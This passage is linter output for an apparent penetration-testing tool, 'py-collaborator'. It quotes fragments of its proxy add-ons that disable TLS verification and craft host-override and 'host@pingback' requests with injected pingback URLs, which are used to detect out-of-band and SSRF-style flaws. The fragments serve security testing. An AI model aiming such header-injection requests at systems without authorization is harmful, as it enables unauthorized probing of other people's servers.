220 |             Logger.dbg('SQL INSERT query (id: {}): "{}"'.format(self.queryId, query))
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
221 |         else:
222 |             Logger.dbg(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:223:17
    |
221 |           else:
222 |               Logger.dbg(
223 | /                 'SQL INSERT query (id: {}): "{}...{}"'.format(
224 | |                     self.queryId, query[:80], query[-80:]
225 | |                 )
    | |_________________^
226 |               )
    |
help: Convert to f-string

B014 [*] Exception handler with duplicate exception: `pymysql.Error`
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:241:16
    |
239 |             return True, 1, None
240 |
241 |         except (pymysql.Error, pymysql.Error) as e:
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
242 |             try:
243 |                 # Rollback introduced changes
    |
help: De-duplicate exceptions

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:245:13
    |
243 |                 # Rollback introduced changes
244 |                 self.databaseConnection.rollback()
245 |             except:
    |             ^^^^^^
246 |                 pass
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:248:13
    |
246 |                   pass
247 |
248 | /             if Database.checkIfReconnectionNeeded(e):
249 | |                 if tryAgain == False:
    | |_____________________________________^
250 |                       Logger.err(
251 |                           "Insert query (ID: {}) ('{}') failed. Need to reconnect.".format(
    |
help: Combine `if` statements using `and`

E712 Avoid equality comparisons to `False`; use `not tryAgain:` for false checks
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:249:20
    |
248 |             if Database.checkIfReconnectionNeeded(e):
249 |                 if tryAgain == False:
    |                    ^^^^^^^^^^^^^^^^^
250 |                     Logger.err(
251 |                         "Insert query (ID: {}) ('{}') failed. Need to reconnect.".format(
    |
help: Replace with `not tryAgain`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:251:25
    |
249 |                   if tryAgain == False:
250 |                       Logger.err(
251 | /                         "Insert query (ID: {}) ('{}') failed. Need to reconnect.".format(
252 | |                             self.queryId, query
253 | |                         )
    | |_________________________^
254 |                       )
255 |                       self.reconnect()
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:259:17
    |
258 |             Logger.err(
259 |                 "Insert Query (ID: {}) ('{}') failed: ".format(self.queryId, query)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
260 |                 + str(e)
261 |             )
    |
help: Convert to f-string

F401 [*] `re` imported but unused
 --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:7:8
  |
5 | import json
6 | import random
7 | import re
  |        ^^
8 | import socket
9 | import string
  |
help: Remove unused import: `re`

F401 [*] `threading.Thread` imported but unused
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:11:29
   |
 9 | import string
10 | import sys
11 | from threading import Lock, Thread
   |                             ^^^^^^
12 | from time import sleep
13 | from urllib.parse import urljoin, urlparse
   |
help: Remove unused import: `threading.Thread`

F401 [*] `time.sleep` imported but unused
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:12:18
   |
10 | import sys
11 | from threading import Lock, Thread
12 | from time import sleep
   |                  ^^^^^
13 | from urllib.parse import urljoin, urlparse
   |
help: Remove unused import: `time.sleep`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:80:8
   |
79 | def dbg(x):
80 |     if "debug" in config.keys() and config["debug"]:
   |        ^^^^^^^^^^^^^^^^^^^^^^^^
81 |         print("[dbg] " + x)
   |
help: Remove `.keys()`

F821 Undefined name `ssl`
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:93:27
   |
92 |             if _ssl:
93 |                 context = ssl.create_default_context()
   |                           ^^^
94 |                 context.check_hostname = False
95 |                 context.options |= ssl.OP_ALL
   |

F821 Undefined name `ssl`
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:95:36
   |
93 |                 context = ssl.create_default_context()
94 |                 context.check_hostname = False
95 |                 context.options |= ssl.OP_ALL
   |                                    ^^^
96 |                 context.verify_mode = ssl.CERT_NONE
   |

F821 Undefined name `ssl`
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:96:39
   |
94 |                 context.check_hostname = False
95 |                 context.options |= ssl.OP_ALL
96 |                 context.verify_mode = ssl.CERT_NONE
   |                                       ^^^
97 |
98 |                 self.sock = context.wrap_socket(sock)
   |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:105:17
    |
103 |             self.sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
104 |             self.sock.connect((host, port))
105 |             dbg("Connected with {}".format(host))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
106 |             return True
    |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:108:29
    |
106 |             return True
107 |
108 |         except Exception as e:
    |                             ^
109 |             ctx.log.error("[!] Could not connect with {}:{}!".format(host, port))
110 |             if config["debug"]:
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:109:27
    |
108 |         except Exception as e:
109 |             ctx.log.error("[!] Could not connect with {}:{}!".format(host, port))
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
110 |             if config["debug"]:
111 |                 raise
    |
help: Convert to f-string

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:129:13
    |
127 |             try:
128 |                 chunk = self.sock.recv(int(chunk_size))
129 |             except:
    |             ^^^^^^
130 |                 if chunk:
131 |                     chunks.append(chunk)
    |

N815 Variable `requestBody` in class scope should not be mixedCase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:154:5
    |
152 |     method = b""
153 |     request = None
154 |     requestBody = None
    |     ^^^^^^^^^^^
155 |
156 |     def __init__(self):
    |

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:161:38
    |
160 |         if CONFIGURATION_FILE:
161 |             config.update(json.loads(open(CONFIGURATION_FILE).read()))
    |                                      ^^^^
162 |
163 |         ctx.log.info("Initializing py-collaborator-mitmproxy-plugin.")
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:208:17
    |
206 |           except Exception as e:
207 |               ctx.log.error(
208 | /                 'SQL query ("{}", params: {}) has failed: {}'.format(
209 | |                     query, str(params), str(e)
210 | |                 )
    | |_________________^
211 |               )
212 |               database_lock.release()
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:221:14
    |
219 |     def requestToString(request):
220 |         headers = "\r\n".join(
221 |             ["{}: {}".format(k, v) for k, v in request.headers.items()]
    |              ^^^^^^^^^^^^^^^^^^^^^
222 |         )
223 |         out = "{} {} {}\r\n{}".format(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:223:15
    |
221 |               ["{}: {}".format(k, v) for k, v in request.headers.items()]
222 |           )
223 |           out = "{} {} {}\r\n{}".format(
    |  _______________^
224 | |             request.command, request.path, request.request_version, headers
225 | |         )
    | |_________^
226 |           return out
    |
help: Convert to f-string

N806 Variable `generatedRequest` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:237:9
    |
235 |     def saveRequestForCorrelation(self, request, pingback, uuid, where):
236 |         query = "INSERT INTO requests(id, sent, uuid, desthost, pingback, whereput, request) VALUES(%s, %s, %s, %s, %s, %s, %s)"
237 |         generatedRequest = PyCollaboratorMitmproxyAddon.requestToString(self.request)
    |         ^^^^^^^^^^^^^^^^
238 |         desthost = self.request.headers["Host"]
239 |         values = (
    |

N803 Argument name `requestData` should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:251:33
    |
250 |     @staticmethod
251 |     def sendRawRequest(request, requestData):
    |                                 ^^^^^^^^^^^
252 |         raw = SendRawHttpRequest()
253 |         port = 80 if request.scheme == "http" else 443
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:260:9
    |
258 |     def hostOverriding(self):
259 |         (pingback, uuid) = PyCollaboratorMitmproxyAddon.getPingbackUrl(self.request)
260 |         requestData = "GET {} HTTP/1.1\r\n".format(pingback)
    |         ^^^^^^^^^^^
261 |         requestData += "Host: {}\r\n".format(self.request.headers["Host"])
262 |         requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578ΓÇª
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:260:23
    |
258 |     def hostOverriding(self):
259 |         (pingback, uuid) = PyCollaboratorMitmproxyAddon.getPingbackUrl(self.request)
260 |         requestData = "GET {} HTTP/1.1\r\n".format(pingback)
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
261 |         requestData += "Host: {}\r\n".format(self.request.headers["Host"])
262 |         requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578ΓÇª
    |
help: Convert to f-string

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:261:9
    |
259 | ΓÇª     (pingback, uuid) = PyCollaboratorMitmproxyAddon.getPingbackUrl(self.request)
260 | ΓÇª     requestData = "GET {} HTTP/1.1\r\n".format(pingback)
261 | ΓÇª     requestData += "Host: {}\r\n".format(self.request.headers["Host"])
    |       ^^^^^^^^^^^
262 | ΓÇª     requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.9ΓÇª
263 | ΓÇª     requestData += "Accept: */*\r\n"
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:262:9
    |
260 | ΓÇª     requestData = "GET {} HTTP/1.1\r\n".format(pingback)
261 | ΓÇª     requestData += "Host: {}\r\n".format(self.request.headers["Host"])
262 | ΓÇª     requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.9ΓÇª
    |       ^^^^^^^^^^^
263 | ΓÇª     requestData += "Accept: */*\r\n"
264 | ΓÇª     requestData += "Connection: close\r\n"
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:263:9
    |
261 | ΓÇª     requestData += "Host: {}\r\n".format(self.request.headers["Host"])
262 | ΓÇª     requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.9ΓÇª
263 | ΓÇª     requestData += "Accept: */*\r\n"
    |       ^^^^^^^^^^^
264 | ΓÇª     requestData += "Connection: close\r\n"
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:264:9
    |
262 |         requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578ΓÇª
263 |         requestData += "Accept: */*\r\n"
264 |         requestData += "Connection: close\r\n"
    |         ^^^^^^^^^^^
265 |
266 |         self.saveRequestForCorrelation(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:276:13
    |
274 |           PyCollaboratorMitmproxyAddon.sendRawRequest(self.request, requestData)
275 |           ctx.log.info(
276 | /             "(2) Re-sent host overriding request ({} -> {})".format(
277 | |                 self.request.path, pingback
278 | |             )
    | |_____________^
279 |           )
    |
help: Convert to f-string

F841 Local variable `url` is assigned to but never used
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:283:9
    |
281 |     def hostAtManipulation(self):
282 |         (pingback, uuid) = PyCollaboratorMitmproxyAddon.getPingbackUrl(self.request)
283 |         url = urljoin(
    |         ^^^
284 |             self.request.scheme + "://", self.request.headers["Host"], self.request.path
285 |         )
    |
help: Remove assignment to unused variable `url`

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:288:9
    |
286 |         parsed = urlparse(pingback)
287 |
288 |         requestData = "GET {} HTTP/1.1\r\n".format(pingback)
    |         ^^^^^^^^^^^
289 |         requestData += "Host: {}@{}\r\n".format(
290 |             self.request.headers["Host"], parsed.netloc
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:288:23
    |
286 |         parsed = urlparse(pingback)
287 |
288 |         requestData = "GET {} HTTP/1.1\r\n".format(pingback)
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
289 |         requestData += "Host: {}@{}\r\n".format(
290 |             self.request.headers["Host"], parsed.netloc
    |
help: Convert to f-string

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:289:9
    |
288 |         requestData = "GET {} HTTP/1.1\r\n".format(pingback)
289 |         requestData += "Host: {}@{}\r\n".format(
    |         ^^^^^^^^^^^
290 |             self.request.headers["Host"], parsed.netloc
291 |         )
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:292:9
    |
290 | ΓÇª         self.request.headers["Host"], parsed.netloc
291 | ΓÇª     )
292 | ΓÇª     requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.9ΓÇª
    |       ^^^^^^^^^^^
293 | ΓÇª     requestData += "Accept: */*\r\n"
294 | ΓÇª     requestData += "Connection: close\r\n"
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:293:9
    |
291 | ΓÇª     )
292 | ΓÇª     requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.9ΓÇª
293 | ΓÇª     requestData += "Accept: */*\r\n"
    |       ^^^^^^^^^^^
294 | ΓÇª     requestData += "Connection: close\r\n"
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:294:9
    |
292 |         requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578ΓÇª
293 |         requestData += "Accept: */*\r\n"
294 |         requestData += "Connection: close\r\n"
    |         ^^^^^^^^^^^
295 |
296 |         self.saveRequestForCorrelation(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:330:17
    |
329 |         try:
330 |             dbg("GET {}".format(url))
    |                 ^^^^^^^^^^^^^^^^^^^^
331 |             requests.get(url, headers={"Host": parsed.netloc})
332 |             ctx.log.info(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:338:27
    |
336 |             )
337 |         except (Exception, requests.exceptions.TooManyRedirects) as e:
338 |             ctx.log.error("Could not issue request to ({}): {}".format(url, str(e)))
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
339 |             if config["debug"]:
340 |                 raise
    |
help: Convert to f-string

E712 Avoid equality comparisons to `False`; use `not rows:` for false checks
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:352:12
    |
351 |         rows = self.executeSql(query)
352 |         if rows == False:
    |            ^^^^^^^^^^^^^
353 |             return rows
354 |         for row in rows:
    |
help: Replace with `not rows`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:394:45
    |
393 |                 self.saveRequestForCorrelation(
394 |                     pingback, header, uuid, "Header: {}".format(header)
    |                                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
395 |                 )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:398:26
    |
397 |             self.sendMisroutedRequests()
398 |             ctx.log.info("Injected pingbacks for host ({}).".format(host))
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
399 |
400 |         return self.requestBody
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:423:23
    |
422 |             def __str__(self):
423 |                 out = "{} {} {}\r\n".format(self.method, self.path, self.http_version)
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
424 |                 for k, v in self.headers.items():
425 |                     out += "{}: {}\r\n".format(k, v)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:425:28
    |
423 |                 out = "{} {} {}\r\n".format(self.method, self.path, self.http_version)
424 |                 for k, v in self.headers.items():
425 |                     out += "{}: {}\r\n".format(k, v)
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^
426 |
427 |                 if self.req_body:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:428:28
    |
427 |                 if self.req_body:
428 |                     out += "\r\n{}".format(self.req_body)
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
429 |
430 |                 return out + "\r\n"
    |
help: Convert to f-string

N816 Variable `globalPyCollaborator` in global scope should not be mixedCase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-mitmproxy-addon.py:447:1
    |
447 | globalPyCollaborator = PyCollaboratorMitmproxyAddon()
    | ^^^^^^^^^^^^^^^^^^^^
448 | addons = [request]
    |

F401 [*] `re` imported but unused
 --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:7:8
  |
5 | import json
6 | import random
7 | import re
  |        ^^
8 | import socket
9 | import string
  |
help: Remove unused import: `re`

F401 [*] `threading.Thread` imported but unused
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:11:29
   |
 9 | import string
10 | import sys
11 | from threading import Lock, Thread
   |                             ^^^^^^
12 | from time import sleep
   |
help: Remove unused import: `threading.Thread`

F401 [*] `time.sleep` imported but unused
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:12:18
   |
10 | import sys
11 | from threading import Lock, Thread
12 | from time import sleep
   |                  ^^^^^
13 |
14 | import requests
   |
help: Remove unused import: `time.sleep`

F401 [*] `proxylogger.ProxyLogger` imported but unused
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:16:25
   |
14 | import requests
15 | from Database import Database
16 | from proxylogger import ProxyLogger
   |                         ^^^^^^^^^^^
17 | from urlparse import urljoin, urlparse
   |
help: Remove unused import: `proxylogger.ProxyLogger`

N803 Argument name `proxyOptions` should be lowercase
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:79:24
   |
78 | class SendRawHttpRequest:
79 |     def __init__(self, proxyOptions, logger):
   |                        ^^^^^^^^^^^^
80 |         self.sock = None
81 |         self.logger = logger
   |

F821 Undefined name `ssl`
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:89:27
   |
88 |             if _ssl:
89 |                 context = ssl.create_default_context()
   |                           ^^^
90 |                 context.check_hostname = False
91 |                 context.options |= ssl.OP_ALL
   |

F821 Undefined name `ssl`
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:91:36
   |
89 |                 context = ssl.create_default_context()
90 |                 context.check_hostname = False
91 |                 context.options |= ssl.OP_ALL
   |                                    ^^^
92 |                 context.verify_mode = ssl.CERT_NONE
   |

F821 Undefined name `ssl`
  --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:92:39
   |
90 |                 context.check_hostname = False
91 |                 context.options |= ssl.OP_ALL
92 |                 context.verify_mode = ssl.CERT_NONE
   |                                       ^^^
93 |
94 |                 self.sock = context.wrap_socket(sock)
   |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:101:29
    |
 99 |             self.sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
100 |             self.sock.connect((host, port))
101 |             self.logger.dbg("Connected with {}".format(host))
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
102 |             return True
    |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:104:29
    |
102 |             return True
103 |
104 |         except Exception as e:
    |                             ^
105 |             self.logger.err("[!] Could not connect with {}:{}!".format(host, port))
106 |             if self.proxyOptions["debug"]:
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:105:29
    |
104 |         except Exception as e:
105 |             self.logger.err("[!] Could not connect with {}:{}!".format(host, port))
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
106 |             if self.proxyOptions["debug"]:
107 |                 raise
    |
help: Convert to f-string

F841 Local variable `resp` is assigned to but never used
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:123:25
    |
121 |         while True:
122 |             try:
123 |                 chunk = resp = self.sock.recv(int(chunk_size))
    |                         ^^^^
124 |             except:
125 |                 if chunk:
    |
help: Remove assignment to unused variable `resp`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:124:13
    |
122 |             try:
123 |                 chunk = resp = self.sock.recv(int(chunk_size))
124 |             except:
    |             ^^^^^^
125 |                 if chunk:
126 |                     chunks.append(chunk)
    |

N815 Variable `requestBody` in class scope should not be mixedCase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:149:5
    |
147 |     method = ""
148 |     request = None
149 |     requestBody = None
    |     ^^^^^^^^^^^
150 |
151 |     def __init__(self, logger, params, proxyOptions=None):
    |

N803 Argument name `proxyOptions` should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:151:40
    |
149 |     requestBody = None
150 |
151 |     def __init__(self, logger, params, proxyOptions=None):
    |                                        ^^^^^^^^^^^^^^^^^
152 |         global config
    |

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:160:38
    |
159 |         if CONFIGURATION_FILE:
160 |             config.update(json.loads(open(CONFIGURATION_FILE).read()))
    |                                      ^^^^
161 |
162 |         config["debug"] = proxyOptions["debug"]
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:209:17
    |
207 |           except Exception as e:
208 |               self.logger.err(
209 | /                 'SQL query ("{}", params: {}) has failed: {}'.format(
210 | |                     query, str(params), str(e)
211 | |                 )
    | |_________________^
212 |               )
213 |               database_lock.release()
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:222:14
    |
220 |     def requestToString(request):
221 |         headers = "\r\n".join(
222 |             ["{}: {}".format(k, v) for k, v in request.headers.items()]
    |              ^^^^^^^^^^^^^^^^^^^^^
223 |         )
224 |         out = "{} {} {}\r\n{}".format(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:224:15
    |
222 |               ["{}: {}".format(k, v) for k, v in request.headers.items()]
223 |           )
224 |           out = "{} {} {}\r\n{}".format(
    |  _______________^
225 | |             request.command, request.path, request.request_version, headers
226 | |         )
    | |_________^
227 |           return out
    |
help: Convert to f-string

N806 Variable `generatedRequest` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:238:9
    |
236 |     def saveRequestForCorrelation(self, request, pingback, uuid, where):
237 |         query = "INSERT INTO requests(id, sent, uuid, desthost, pingback, whereput, request) VALUES(%s, %s, %s, %s, %s, %s, %s)"
238 |         generatedRequest = ProxyHandler.requestToString(self.request)
    |         ^^^^^^^^^^^^^^^^
239 |         desthost = self.request.headers["Host"]
240 |         values = (
    |

N803 Argument name `requestData` should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:252:33
    |
251 |     @staticmethod
252 |     def sendRawRequest(request, requestData, proxyOptions, logger):
    |                                 ^^^^^^^^^^^
253 |         raw = SendRawHttpRequest(proxyOptions, logger)
254 |         port = 80 if request.scheme == "http" else 443
    |

N803 Argument name `proxyOptions` should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:252:46
    |
251 |     @staticmethod
252 |     def sendRawRequest(request, requestData, proxyOptions, logger):
    |                                              ^^^^^^^^^^^^
253 |         raw = SendRawHttpRequest(proxyOptions, logger)
254 |         port = 80 if request.scheme == "http" else 443
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:261:9
    |
259 |     def hostOverriding(self):
260 |         (pingback, uuid) = ProxyHandler.getPingbackUrl(self.request)
261 |         requestData = "GET {} HTTP/1.1\r\n".format(pingback)
    |         ^^^^^^^^^^^
262 |         requestData += "Host: {}\r\n".format(self.request.headers["Host"])
263 |         requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578ΓÇª
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:261:23
    |
259 |     def hostOverriding(self):
260 |         (pingback, uuid) = ProxyHandler.getPingbackUrl(self.request)
261 |         requestData = "GET {} HTTP/1.1\r\n".format(pingback)
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
262 |         requestData += "Host: {}\r\n".format(self.request.headers["Host"])
263 |         requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578ΓÇª
    |
help: Convert to f-string

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:262:9
    |
260 | ΓÇª     (pingback, uuid) = ProxyHandler.getPingbackUrl(self.request)
261 | ΓÇª     requestData = "GET {} HTTP/1.1\r\n".format(pingback)
262 | ΓÇª     requestData += "Host: {}\r\n".format(self.request.headers["Host"])
    |       ^^^^^^^^^^^
263 | ΓÇª     requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.9ΓÇª
264 | ΓÇª     requestData += "Accept: */*\r\n"
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:263:9
    |
261 | ΓÇª     requestData = "GET {} HTTP/1.1\r\n".format(pingback)
262 | ΓÇª     requestData += "Host: {}\r\n".format(self.request.headers["Host"])
263 | ΓÇª     requestData += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.9ΓÇª
    |       ^^^^^^^^^^^
264 | ΓÇª     requestData += "Accept: */*\r\n"
265 | ΓÇª     requestData += "Connection: close\r\n"
    |

N806 Variable `requestData` in function should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\py-collaborator-proxy2-plugin.py:264:9
    |
262 | ΓÇª     requestData += "Host: {}\r\n".format(self.request.headers["Host"])
